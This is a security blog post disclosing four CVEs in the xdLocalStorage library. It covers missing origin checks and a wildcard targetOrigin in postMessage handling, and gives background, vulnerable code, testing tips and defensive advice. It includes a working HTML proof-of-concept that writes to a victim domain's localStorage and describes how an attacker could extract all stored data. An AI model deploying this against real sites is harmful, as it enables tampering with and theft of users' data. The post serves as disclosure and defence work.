=== Content from grimhacker.com_434a3461_20250119_124347.html ===

[Skip to content](#main)

[GrimBlog](https://grimhacker.com)

Just another hacking blog...

open primary menu

* [twitter](https://twitter.com/grimhacker)
* [linkedin](https://www.linkedin.com/in/oliver-morton-2b4a8163/)
* email
* [bitbucket](https://bitbucket.org/grimhacker/)
* [github](https://github.com/grimhacker)
* [mastodon](https://infosec.exchange/web/%40grimhacker)

* [About](https://grimhacker.com/about/)
* [Presentations](https://grimhacker.com/presentations/)
* [Public Vulnerability Disclosures](https://grimhacker.com/public-vulnerability-disclosures/)
* [Tools](https://grimhacker.com/tools/)

# Sidebar

## Search

Search

## Recent Posts

* [“NginxDay2022”: NGINX LDAP reference implementation Zero Day Vulnerability](https://grimhacker.com/2022/05/22/nginxday2022/)
* [SQLAlchemy Postgres On Conflict Do Update “can’t adapt type ‘method'”](https://grimhacker.com/2022/02/05/sqlalchemy-postgres-on-conflict-do-update-cant-adapt-type-method/)
* [Exploiting xdLocalStorage (localStorage and postMessage)](https://grimhacker.com/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/)
* [Parsing .DS\_Store Files](https://grimhacker.com/2019/05/06/parsing-ds_store-files/)
* [MSSQL : You get admin! You get admin! EVERYONE GETS ADMIN!](https://grimhacker.com/2018/04/14/mssql-you-get-admin-you-get-admin-everyone-gets-admin/)
## Archives

* [May 2022](https://grimhacker.com/2022/05/)
* [February 2022](https://grimhacker.com/2022/02/)
* [April 2020](https://grimhacker.com/2020/04/)
* [May 2019](https://grimhacker.com/2019/05/)
* [April 2018](https://grimhacker.com/2018/04/)
* [March 2018](https://grimhacker.com/2018/03/)
* [July 2017](https://grimhacker.com/2017/07/)
* [April 2016](https://grimhacker.com/2016/04/)
* [February 2016](https://grimhacker.com/2016/02/)
* [January 2016](https://grimhacker.com/2016/01/)
* [December 2015](https://grimhacker.com/2015/12/)
* [April 2015](https://grimhacker.com/2015/04/)
* [November 2014](https://grimhacker.com/2014/11/)
* [September 2014](https://grimhacker.com/2014/09/)
* [July 2014](https://grimhacker.com/2014/07/)
* [June 2014](https://grimhacker.com/2014/06/)
* [May 2014](https://grimhacker.com/2014/05/)
## Categories

* [Disclosures](https://grimhacker.com/category/disclosures/) (4)
* [Installing and Configuring (notes to my future self)](https://grimhacker.com/category/installing-and-configuring-notes-to-my-future-self/) (8)
* [Ramblings](https://grimhacker.com/category/ramblings/) (4)
* [Tools and Techniques](https://grimhacker.com/category/tools/) (16)
  + [My Continuing Mission to Replace Myself with a Very Small Script](https://grimhacker.com/category/tools/my-tools/) (7)
* [Uncategorized](https://grimhacker.com/category/uncategorized/) (1)

Privacy & Cookies: This site uses cookies. By continuing to use this website, you agree to their use.

To find out more, including how to control cookies, see here:
[Cookie Policy](https://automattic.com/cookies/)

![I'll allow it](https://i0.wp.com/grimhacker.com/wp-content/uploads/2020/04/allow_it.gif?fit=498%2C278&ssl=1)
# Exploiting xdLocalStorage (localStorage and postMessage)

Published by [GrimHacker](https://grimhacker.com/author/grimhacker/) on [2 April 2020](https://grimhacker.com/2020/04/)

Last updated on 7 April 2020

Some time ago I came across a site that was using xdLocalStorage after I had been looking into the security of HTML5 postMessage. I found that the library had several common security flaws around lack of origin validation and then noticed that there was already an open issue in the project for this problem, added it to my list of things to blog about, and promptly forgot about it.

This week I have found the time to actually write this post which I hope will prove useful not only for those using xdLocalStorage, but more generally for those attempting to find (or avoid introducing) vulnerabilities when Web Messaging is in use.

# Contents

* [Background](#Background)
  + [What is xdLocalStorage?](#What-is-xdLocalStorage)
  + [Origin](#Origin)
    - [Same Origin](#Same-Origin)
  + [HTML5](#HTML5)
    - [Web Storage](#Web-Storage)
      * [DNS Spoofing Attacks](#DNS-Spoofing-Attacks)
      * [Cross Directory Attacks](#Cross-Directory-Attacks)
      * [A note to testers](#Web-Storage-A-note-to-testers)
    - [Web Messaging (AKA cross-document messaging AKA postMessage)](#Web-Messaging-(AKA-cross-document-messaging-AKA-postMessage))
      * [Receiving a message](#Receiving-a-message)
      * [Sending a message](#Sending-a-message)
      * [A note to testers](#Web-Messaging-A-note-to-testers)
* [The Vulnerability in xdLocalStorage](#The-Vulnerability-in-xdLocalStorage)
  + [Normal Operation Walk Through](#Normal-Operation-Walk-Through)
    - [Visual Example](#Visual-Example)
  + [The Vulnerabilities](#The-Vulnerabilities)
    - [Missing origin validation when receiving messages](#Missing-origin-validation-when-receiving-messages)
      * [Magic iframe – CVE-2015-9544](#Missing-Origin-Magic-iframe)
      * [Client – CVE-2015-9545](#Missing-Origin-Client)
    - [Wildcard targetOrigin when sending messages](#Wildcard-targetOrigin-when-sending-messages)
      * [Magic iframe – CVE-2020-11610](#Missing-TargetOrigin-Magic-iframe)
      * [Client – CVE-2020-11611](#Missing-TargetOrigin-Client)
  + [How Wide Spread is the Issue in xdLocalStorage?](#How-Wide-Spread-is-the-Issue)
* [Defence](#Defence)
  + [xdLocalStorage](#xdLocalStorage)
  + [Web Messaging](#Defence-Web-Messaging)
  + [Web Storage](#Defence-Web-Storage)

# Background

## What is xdLocalStorage?

> *“xdLocalStorage is a lightweight js library which implements LocalStorage interface and support cross domain storage by using iframe post message communication.”* [sic]
>
> <https://github.com/ofirdagan/cross-domain-local-storage/blob/master/README.md>

This library aims to solve the following problem:

> *“As for now, standard HTML5 Web Storage (a.k.a Local Storage) doesn’t now allow cross domain data sharing. This may be a big problem in an organization which have a lot of sub domains and wants to share client data between them.”* [sic]
>
> <https://github.com/ofirdagan/cross-domain-local-storage/blob/master/README.md>

## Origin

> *“Origins are the fundamental currency of the Web’s security model. Two actors in the Web platform that share an origin are assumed to trust each other and to have the same authority. Actors with differing origins are considered potentially hostile versus each other, and are isolated from each other to varying degrees.
> For example, if Example Bank’s Web site, hosted at `bank.example.com`, tries to examine the DOM of Example Charity’s Web site, hosted at `charity.example.org`, a `SecurityError` `DOMException` will be raised.”*
>
>  <https://html.spec.whatwg.org/multipage/origin.html>

Origin may be an “opaque origin” or a “tuple origin”.

The former is serialised to “null” and can only meaningfully be tested for equality. A unique opaque origin is assigned to an img, audio, or video element when the data is fetched cross origin. An opaque origin is also used for sandboxed documents, data urls, and potentially in other circumstances.

The latter is more commonly encountered and consists of:

* [Scheme](https://url.spec.whatwg.org/#concept-url-scheme) (e.g. “http”, “https”, “ftp”, “ws”, etc)
* [Host](https://url.spec.whatwg.org/#concept-host) (e.g. “www.example.com”, “203.0.113.1”, “2001:db8::1”, “localhost”)
* [Port](https://url.spec.whatwg.org/#concept-url-port) (e.g. 80, 443, or 1234)
* [Domain](https://url.spec.whatwg.org/#concept-domain) (e.g. “www.example.com”) [defaults to null]

*Note “Domain” can usually be ignored to aid understanding, but is included within the specification*.

### Same Origin

Two origins, A and B, are said to be same origin if:

1. A and B are the same opaque origin
2. A and B are both tuple origins and their schemes, hosts, and port are identical

The following table shows several examples of origins for A and B and indicates if they are the same origin or not:

| A | B | same origin |
| --- | --- | --- |
| https://example.com | https://example.com | YES |
| http://example.com | https://example.com | NO |
| http://example.com | http://example.com:80 | YES |
| https://example.com | https://example.com:8443 | NO |
| https://example.com | https://www.example.com | NO |
| http://example.com:8080 | http://example.com:8081 | NO |

## HTML5

HTML5 was first released in 2008 (and has since been replaced by the “HTML Living Standard”) it introduced a range of new features including “Web Storage” and “Web Messaging”.

### Web Storage

Web storage allows applications to store data locally within the user’s browser as strings in key/value pairs, significantly more data can be stored than in cookies.

There are two types: local storage (localStorage) and session storage (sessionStorage). The first stores the data with no expiration whereas the second only stores it for that one session (closing the browser tab loses the data).

There are a several security considerations when utilising web storage, as might be expected these are around access to the data. Access to web storage is restricted to the same origin.

#### **DNS Spoofing Attacks**

If an attacker successfully performs a [DNS spoofing](https://en.wikipedia.org/wiki/DNS_spoofing) attack, the user’s browser will connect to the attacker’s web server and treat all responses and content as if it came from the legitimate domain (which has been spoofed). This means that the attacker will then have access to the contents of web storage and can read and manipulate it as the origin will match. *In order to prevent this, it is critical that all applications are served over a secure HTTPS connection that utilise valid TLS certificates and [HSTS](https://www.troyhunt.com/understanding-http-strict-transport/) to prevent a connection being established to a malicious server.*

#### **Cross Directory Attacks**

Applications that are deployed to different paths within a domain usually have the same origin (i.e. same scheme, domain/host, and port) as each other. This means that JavaScript in one application can manipulate the contents of other applications within the same origin, this is a common concern for [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) vulnerabilities. However what may be overlooked is that sites with the same origin also share the same web storage objects, potentially exposing sensitive data set by one application to an attacker gaining access to another. *It is therefore recommended applications deployed in this manner avoid utilising web storage.*

#### **A note to testers**

Web storage is read and manipulated via JavaScript functions in the user’s browser, therefore you will not see much evidence of its use in your intercepting proxy (unless you closely review all JavaScript loaded by the application). You can utilise the developer tools in the browser to view the contents of [local storage](https://developers.google.com/web/tools/chrome-devtools/storage/localstorage) and [session storage](https://developers.google.com/web/tools/chrome-devtools/storage/sessionstorage) or use the [developer console to execute JavaScript](https://developers.google.com/web/tools/chrome-devtools/console/javascript) and [access the data](https://www.w3schools.com/html/html5_webstorage.asp).

For further information about web storage refer to the [specification](https://html.spec.whatwg.org/multipage/webstorage.html#webstorage).
For further information about using web storage safely refer to the [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage).

### Web Messaging (AKA cross-document messaging AKA postMessage)

For security and privacy reasons web browsers prevent documents in different origins from affecting each other. This is a critical security feature to prevent malicious sites from reading data from other origin the user may have accessed with the same browser, or executing JavaScript within the context of the other origin.

However sometimes an application has a legitimate need to communicate with another application within the user’s browser. For example an organisation may own several domains and need to pass information about the user between them. [One technique that was used to achieve this was JSONP which I have blogged about previously.](https://grimhacker.com/exploiting-jsonp/)

The HTML Standard has introduced a messaging system that allows documents to communicate with each other regardless of their source origin in order to meet this requirement without enabling [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) attacks.

Document “A” can create an `iframe` (or open a window) that contains document “B”.
Document “A” can then call the `postMessage()` method on the Window object of document “B” to trigger a message event and pass information from “A” to “B”.
 Document “B” can also use the `postMessage()` method on the `window.parent` or `window.opener` object to send a message to the document that opened it (in this example document “A”).

Messages can be structured objects, e.g. nested objects and arrays, can contain JavaScript values (`String`, `Number`, `Date` objects, etc), and can contain certain data objects such as `File Blob`, `FileList`, and `ArrayBuffer` objects.

I have most commonly seen messages consisting of strings containing JSON. i.e. the sender uses `JSON.stringify(data)` and the receiver uses `data = JSON.parse(event.data)`.

*Note that a HTML postMessage is completely different from a HTTP POST message*!

*Note Cross-Origin Resource Sharing (CORS) can also be used to allow a web application running at one origin to access selected resources from a different origin, however that is not the focus of this post. Refer to the [article from Mozilla for further information about CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).*

#### **Receiving a message**

In order to receive messages an event handler must be registered for incoming events. For example the `addEventListener()` method (often on the `window`) might be used to specify a function which should be called when events of type `'message'` are fired.

It is the developer’s responsibility to check the `origin` attribute of any messages received to ensure that they only accept messages from origins they expect.

It is not uncommon to encounter message handling functions that are not performing any origin validation at all. However even when origin validation is attempted it is often insufficiently robust. For example (assuming the developer intended to allow messages from `https://www.example.com`):

* Regular expressions which do not escape the wildcard `.` character in domain names.
  e.g. `https://wwwXexample.com` is a valid domain name that could be registered by an attacker and would pass the following:
  `var regex = /https*:\/\/www.example.com$/i; if regex.test(event.origin) {//accepted}`
* Regular expressions which do not check the string ends by using the `$` character at the end of the expression.
  e.g. `https://www.example.com.grimhacker.com` is a valid domain that could be under the attacker’s control and pass the following:
  `var regex = /https*:\/\/www\.example\.com/i; if regex.test(event.origin) {//accepted}`
* Using `indexOf` to verify the origin contains the expected domain name, without accounting for the entire origin (e.g. `https://www.example.com.grimhacker.com` would pass the following check: `if (event.origin.indexOf("https://www.example.com")> -1) {//accepted}`

Even when robust origin validation is performed, the application must still perform input validation on the data received to ensure it is in the expected format before utilising it. The application must treat the message as data rather than evaluating it as code (e.g. via `eval()`), and avoid inserting it into the DOM (e.g. via innerHTML). This is because any vulnerability (such as [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)) in an allowed domain may give an attacker the opportunity to send malicious messages from the trusted origin, which may compromise the receiving application.

The impact of an a malicious message being processed depends on the vulnerable application’s processing of the data sent, however [DOM Based Cross Site Scripting](https://owasp.org/www-community/attacks/DOM_Based_XSS) is common.

#### **Sending a message**

When sending a message using the `postMessage()` method of a window the developer has the option of specifying the `targetOrigin` of the message either as a parameter or within the object passed in the `options` parameter; if the `targetOrigin` is not specified it defaults to `/` which restricts the message to same origin targets only. It is possible to use the wildcard `*` to allow any origin to receive the message.

*It is important to ensure that messages include a specific `targetOrigin`, particularly when the message contains sensitive information.*

It may be tempting for developers to use the wildcard if they have created the `window` object since it is easy to assume that the document within the `window` must be the one they intend to communicate with, however if the `location` of that `window` has changed since it was created the message will be sent to the new location, which may not be an origin which was ever intended.

Likewise a developer may be tempted to use the wildcard when sending a message to `window.parent`, as they believe only legitimate domains can/will be the parent frame/window. This is often not the case and a malicious domain can open a `window` to the vulnerable application and wait to receive sensitive information via a message.

#### **A note to testers**

Web messages are entirely within the user’s browser, therefore you will not see any evidence of them within your intercepting proxy (unless you closely review all JavaScript loaded by the application).

You can check for registered message handlers in the “Global Listeners” section of the debugger pane in the Sources tab of the Chrome developer tools:

![Click F12 to open developer tools, click the
"Sources" tab, on the debugger pane click "Global Listeners", expand the "message" section to show message handlers.](https://i0.wp.com/grimhacker.com/wp-content/uploads/2020/03/postmessage_global_listeners.png?resize=778%2C449&ssl=1)

You can use the `[monitorEvents()](https://developers.google.com/web/updates/2015/05/quickly-monitor-events-from-the-console-panel)` console command in the chrome developer tools to print messages to the console. e.g. to monitor message events sent from or received by the window: `monitorEvents(window, "message")`.

Note that you are likely to miss messages that are sent as soon as the page loads using this method as you will not have had the opportunity to start monitoring. Additionally although this will capture messages sent and received to nested `iframes` in the same `window`, it will not capture messages sent to another `window`.

The most robust method I know of for capturing postMessages is the [PMHook](https://pmhook.appcheck-ng.com/) tool from AppCheck, usage of this tool is described in their [Hunting HTML5 postMessage Vulnerabilities](https://appcheck-ng.com/hunting-html-5-postmessage-vulnerabilities/) paper.

Once you have captured the message, are able to reproduce it, and you have found the handler function you will want to use breakpoints in the handler function in order to step through the code and identify issues in the handling of messages. The following resource from Google provides an introduction to using the developer tools in Chrome: <https://developers.google.com/web/tools/chrome-devtools/javascript>

For further information about web messaging refer to the [specification](https://html.spec.whatwg.org/multipage/web-messaging.html#web-messaging).
For further information about safely using web messaging refer to the [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging).
For more in depth information regarding finding and exploiting vulnerabilities in web messages I recommend the paper [Hunting HTML5 postMessage Vulnerabilities](https://appcheck-ng.com/hunting-html-5-postmessage-vulnerabilities/) from Sec-1/AppCheck.

# The Vulnerability in xdLocalStorage

## Normal Operation Walk Through

Normal usage of the xdLocalStorage library (according to the README) is to create a HTML document which imports `xdLocalStoragePostMessageApi.min.js` on the domain that will store the data – this is the “magical iframe”; and import `xdLocalStorage.min.js` on the “client page” which needs to manipulate the data. *Note angular applications can import `ng-xdLocalStorage.min.js` and include `xdLocalStorage` and inject this module where required to use the API.*

### The client

The interface is initialised on the client page with the URL of the “magical iframe” after which the `setItem()`, `getItem()`, `removeItem()`, `key()`, and `clear()` API functions can be called to interact with the local storage of the domain hosting the “magical iframe”.

When the library initialises on the client page it appends an `iframe` to the `body` of the page which loads the “magical iframe” document. It also registers an event handler using addEventListener or attachEvent (depending on browser capabilities). The init function is included below ([line 56 of xdLocalStorage.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStorage.js#L56)):

```
  function init(customOptions) {
    options = XdUtils.extend(customOptions, options);
    var temp = document.createElement('div');

    if (window.addEventListener) {
      window.addEventListener('message', receiveMessage, false);
    } else {
      window.attachEvent('onmessage', receiveMessage);
    }

    temp.innerHTML = '<iframe id="' + options.iframeId + '" src="' + options.iframeUrl + '" style="display: none;"></iframe>';
    document.body.appendChild(temp);
    iframe = document.getElementById(options.iframeId);
  }
```

When the client page calls one of the API functions it must supply any required parameters (e.g. `getItem()` requires the key name is specified), and a callback function. The API function calls the `buildMessage()` function passing an appropriate action string for itself, along with the parameters and callback function. The `getItem()` API function is included below as an example ([line 125 of xdLocalStorage.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStorage.js#L125)):

```
    getItem: function (key, callback) {
      if (!isApiReady()) {
        return;
      }
      buildMessage('get', key,  null, callback);
    },
```

The `buildMessage()` function increments a `requestId` and stores the callback associated to this `requestId`. It then creates a data object containing a namespace, the `requestId`, the action to be performed (e.g. `getItem()` causes a `"get"` action), key name, and value. This data is converted to a string and sent as a postMessage to the “magical iframe”. The `buildMessage()` function is included below ([line 43 in xdLocalStorage.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStorage.js#L43)):

```
function buildMessage(action, key, value, callback) {
    requestId++;
    requests[requestId] = callback;
    var data = {
      namespace: MESSAGE_NAMESPACE,
      id: requestId,
      action: action,
      key: key,
      value: value
    };
    iframe.contentWindow.postMessage(JSON.stringify(data), '*');
  }
```
### The “magical iframe”

When the document is loaded a handler function is attached to the window (using either `addEventListener()` or `attachEvent()` depending on browser support) as shown below ([line 90 in xdLocalStoragePostMessageApi.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStoragePostMessageApi.js#L90)):

```
  if (window.addEventListener) {
    window.addEventListener('message', receiveMessage, false);
  } else {
    window.attachEvent('onmessage', receiveMessage);
  }
```

It then sends a message to the parent window to indicate it is ready ([line 96 in xdLocalStoragePostMessageApi.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStoragePostMessageApi.js#L96)):

```
  function sendOnLoad() {
    var data = {
      namespace: MESSAGE_NAMESPACE,
      id: 'iframe-ready'
    };
    parent.postMessage(JSON.stringify(data), '*');
  }
  //on creation
  sendOnLoad();
```

When a message is received, the browser will call the function that has been registered and pass it the `event` object. The `receiveMessage()` function will attempt to parse the `event.data` attribute as JSON and if successful check if the `namespace` attribute of the `data` object matches the configured `MESSAGE_NAMESPACE`. It will then call the required function based on the value of the `data.action` attribute, for example `"get"` results in a call to `getData()` which is passed the `data.key` attribute. The `receiveMessage()` function is included below ([line 63 of xdLocalStoragePostMessageApi.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStoragePostMessageApi.js#L63)):

```
  function receiveMessage(event) {
    var data;
    try {
      data = JSON.parse(event.data);
    } catch (err) {
      //not our message, can ignore
    }

    if (data && data.namespace === MESSAGE_NAMESPACE) {
      if (data.action === 'set') {
        setData(data.id, data.key, data.value);
      } else if (data.action === 'get') {
        getData(data.id, data.key);
      } else if (data.action === 'remove') {
        removeData(data.id, data.key);
      } else if (data.action === 'key') {
        getKey(data.id, data.key);
      } else if (data.action === 'size') {
        getSize(data.id);
      } else if (data.action === 'length') {
        getLength(data.id);
      } else if (data.action === 'clear') {
        clear(data.id);
      }
    }
  }
```

The selected function will then directly interact with the `localStorage` object to carry out the requested action and call the `postData()` function to send the data back to the parent window. To illustrate this the `getData()` and `postData()` functions are shown below (respectively lines [20](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStoragePostMessageApi.js#L20) and [14](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStoragePostMessageApi.js#L14) in xdLocalStoragePostMessageApi.js)

```
  function getData(id, key) {
    var value = localStorage.getItem(key);
    var data = {
      key: key,
      value: value
    };
    postData(id, data);
  }
```
```
  function postData(id, data) {
    var mergedData = XdUtils.extend(data, defaultData);
    mergedData.id = id;
    parent.postMessage(JSON.stringify(mergedData), '*');
  }
```
### The client

When a message is received, the browser will call the function that has been registered and pass it the `event` object. The `receiveMessage()` function will attempt to parse the `event.data` attribute as JSON and if successful check if the `namespace` attribute of the `data` object matches the configured `MESSAGE_NAMESPACE`. If the `data.id` attribute is `"iframe-ready"` then the `initCallback()` function is executed (if one has been configured), otherwise the data object is passed to the `applyCallback()` function. This is shown below ([line 26 of xdLocalStorage.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStorage.js#L26)):

```
  function receiveMessage(event) {
    var data;
    try {
      data = JSON.parse(event.data);
    } catch (err) {
      //not our message, can ignore
    }
    if (data && data.namespace === MESSAGE_NAMESPACE) {
      if (data.id === 'iframe-ready') {
        iframeReady = true;
        options.initCallback();
      } else {
        applyCallback(data);
      }
    }
  }
```

The `applyCallback()` function simply uses the `data.id` attribute to find the callback function that was stored for the matching `requestId` and executes it, passing it the data. This is shown below ([line 19 of xdLocalStorage.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStorage.js#L19)):

```
  function applyCallback(data) {
    if (requests[data.id]) {
      requests[data.id](data);
      delete requests[data.id];
    }
  }
```
### Visual Example

![SiteA loads SiteB in an iframe. SiteB sends an "iframe-ready" message to SiteA. getItem is used by SiteA, which causes SiteA to send a "get" action message to SiteB and store a callback function alongside the requestId. SiteB gets the requested key value from local storage. SiteB sends the key/value to SiteA in a postMessage. SiteA executes the callback for the matching requestId and passes it the data.](https://i0.wp.com/grimhacker.com/wp-content/uploads/2020/04/xdLocalStorage.js-getItem-Example-Sequence-Diagram.png?resize=793%2C386&ssl=1)

The sequence diagram shows (at a very high level) the interaction between the client (SiteA) and the “magical iframe” (SiteB) when the getItem function is called.

## The Vulnerabilities

### Missing origin validation when receiving messages

#### **Magic iframe** – CVE-2015-9544

The `receiveMessage()` function in [xdLocalStoragePostMessageApi.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStoragePostMessageApi.js#L63) does not implement any validation of the origin. The only requirements for the message to be successfully processed are that the message is a string that can be parsed as JSON, the `namespace` attribute of the message matches the configured `MESSAGE_NAMESPACE` (default is `"cross-domain-local-message"`), and the action attribute is one of the following strings: `"set"`, `"get"`, `"remove"`, `"key"`, `"size"`, `"length"`, or `"clear"`.

Therefore a malicious domain can send a message that meets these requirements and manipulate the local storage of the domain.

In order to exploit this issue an attacker would need to entice a user to load a malicious site, which then interacts with the legitimate site hosting the “magical iframe”.

The following proof of concept allows the user to set a value for “pockey” in the local storage of the domain hosting the vulnerable “magic iframe”. However it would also be possible to retrieve all information from local storage and send this to the attacker, by exploiting this issue in combination with the use of a wildcard targetOrigin (discussed below).

```
<html>
	<!-- POC exploit for xdLocalStorage.js by GrimHacker https://grimhacker.com/exploiting-xdlocalstorage-(localstorage-and-postmessage) -->
	<body>
		<script>
			var MESSAGE_NAMESPACE = "cross-domain-local-message";
			var targetSite = "http://siteb.grimhacker.com:8000/cross-domain-local-storage.html" // magical iframe;

			var iframeId = "vulnerablesite";
			var a = document.createElement("a");
			a.href = targetSite;
			var targetOrigin = a.origin;

			function receiveMessage(event) {
				var data;
				data = JSON.parse(event.data);
				var message = document.getElementById("message");
				message.textContent = "My Origin: " + window.origin + "\r\nevent.origin: " + event.origin + "\r\nevent.data: " + event.data;
			}

			window.addEventListener('message', receiveMessage, false);

			var temp = document.createElement('div');
			temp.innerHTML = '<iframe id="' + iframeId + '" src="' + targetSite + '" style="display: none;"></iframe>';
			document.body.appendChild(temp);
			iframe = document.getElementById(iframeId);

			function setValue() {
				var valueInput = document.getElementById("valueInput");
				var data = {
					namespace: MESSAGE_NAMESPACE,
					id: 1,
					action: "set",
					key: "pockey",
					value: valueInput.value
				}
				iframe.contentWindow.postMessage(JSON.stringify(data), targetOrigin);
			}
		</script>
		<div class=label>Enter a value to assign to "pockey" on the vulnerable target:</div><input id=valueInput></div>
		<button onclick=setValue()>Set pockey</button>
		<div><p>The latest postmessage received will be shown below:</div>
		<div id="message" style="white-space: pre;"></div>
		</body>
</html>
```

The screenshots below demonstrate this:

![](https://i0.wp.com/grimhacker.com/wp-content/uploads/2020/04/sitea_pockey1.png?resize=514%2C240&ssl=1)

SiteA loads an iframe for cross-domain-local-storage.html on SiteB and receives an “iframe-ready” postMessage.

![](https://i0.wp.com/grimhacker.com/wp-content/uploads/2020/04/sitea_pockey2.png?resize=525%2C242&ssl=1)

SiteA sends a postMessage to the SiteB iframe to set the key “pockey” with the specified value “pocvalue” in the SiteB local storage. SiteB sends a postMessage to SiteA to indicate success.

![](https://i0.wp.com/grimhacker.com/wp-content/uploads/2020/04/siteb_pockey.png?resize=928%2C523&ssl=1)

Checking the localstorage for SiteB shows the key and value have been set.

Depending on how the local storage data is used by legitimate client application, altering the data as shown above may impact the security of the client application.

#### **Client** – CVE-2015-9545

The `receiveMessage()` function in [xdLocalStorage.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStorage.js#L26) does not implement any validation of the origin. The only requirements for the message to be successfully processed are that the message is a string that can be parsed as JSON, the `data.namespace` attribute of the message matches the configured `MESSAGE_NAMESPACE` (default is `"cross-domain-local-message"`), and the `data.id` attribute of the message matches a `requestId` that is currently pending.

Therefore a malicious domain can send a message that meets these requirements and cause their malicious data to be processed by the callback configured by the vulnerable application. Note that `requestId` is a number that increments with each legitimate request the vulnerable application sends to the “magic iframe”, therefore exploitation would include winning a race condition.

In order to exploit this issue an attacker would need to entice a user to load a malicious site, which then interacts with the legitimate client site. Exact exploitation of this issue would depend on how the vulnerable application uses the data they intended to retrieve from local storage, analysis of the functionality would be required in order to identify a valid attack vector.

### Wildcard targetOrigin when sending messages

#### **Magic iframe** – CVE-2020-11610

The `postData()` function in [xdLocalStoragePostMessageApi.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStoragePostMessageApi.js#L14) specifies the wildcard (`*`) as the `targetOrigin` when calling the `postMessage()` function on the `parent` object. Therefore any domain can load the application hosting the “magical iframe” and receive the messages that the “magical iframe” sends.

In order to exploit this issue an attacker would need to entice a user to load a malicious site, which then interacts with the legitimate site hosting the “magical iframe” and receives any messages it sends as a result of the interaction.

Note that this issue can be combined with the lack of origin validation to recover all information from local storage. An attacker could first retrieve the length of local storage and then iterate through each key index and the “magical iframe” would send the key and value to the parent, which in this case would be the attacker’s domain.

#### **Client** – CVE-2020-11611

The `buildMessage()` function in [xdLocalStorage.js](https://github.com/ofirdagan/cross-domain-local-storage/blob/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStorage.js#L43) specifies the wildcard (`*`) as the `targetOrigin` when calling the `postMessage()` function on the `iframe` object. Therefore any domain that is currently loaded within the `iframe` can receive the messages that the client sends.

In order to exploit this issue an attacker would need to redirect the “magical iframe” loaded on the vulnerable application within the user’s browser to a domain they control. This is non trivial but there may be some scenarios where this can occur.

If an attacker were able to successfully exploit this issue they would have access to any information that the client sends to the `iframe`, and also be able to send messages back with a valid `requestId` which would then be processed by the client, this may then further impact the security of the client application.

## How Wide Spread is the Issue in xdLocalStorage?

At the time of writing all versions of xdLocalStorage (previously called cross-domain-local-storage) are vulnerable – i.e release 1.0.1 (released 2014-04-17) to 2.0.5 (released 2017-04-14).

According to the project README the recommended method of installing is via bower or npm. npmjs.com shows that the library has around 350 weekly downloads (March 2020).

![Screenshot of https://npmjs.com/package/xdlocalstorage showing xdlocalstorage 2.0.5 has 349 weekly downloads.](https://i0.wp.com/grimhacker.com/wp-content/uploads/2020/03/xdlocalstorage_npm.png?resize=1141%2C831&ssl=1)

<https://npmjs.com/package/xdlocalstorage> (2020-03-20)

# Defence

## xdLocalStorage

This issue has been known since at least August 2015 when [Hengjie](https://github.com/Hengjie) opened an Issue on the GitHub repository to notify the project owner (<https://github.com/ofirdagan/cross-domain-local-storage/issues/17>). However the Pull request which included functionality to whitelist origins has not been accepted or worked on since July 2016 (<https://github.com/ofirdagan/cross-domain-local-storage/pull/19>). The last commit on the project (at the time of writing) was in August 2018. Therefore a fix from the project maintainer may not be forthcoming.

Consider replacing this library with a maintained alternative which includes robust origin validation, or implement validation within the existing library.

## Web Messaging

* Refer to the [OWASP HTML 5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging).
* When sending a message explicitly state the targetOrigin (do not use the wildcard `*`)
* When receiving a message carefully validate the origin of any message to ensure it is from an expected source.
* When receiving a message carefully validate the data to ensure it is in the expected format and safe to use in the context it is in (e.g. HTML markup within the data may not be safe to embed directly into the page as this would introduce [DOM Based Cross Site Scripting](https://owasp.org/www-community/attacks/DOM_Based_XSS)).

## Web Storage

* Refer to the [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging).
### Share:

* [Click to share on Twitter (Opens in new window)](https://grimhacker.com/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/?share=twitter "Click to share on Twitter")
* [Click to share on Facebook (Opens in new window)](https://grimhacker.com/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/?share=facebook "Click to share on Facebook")
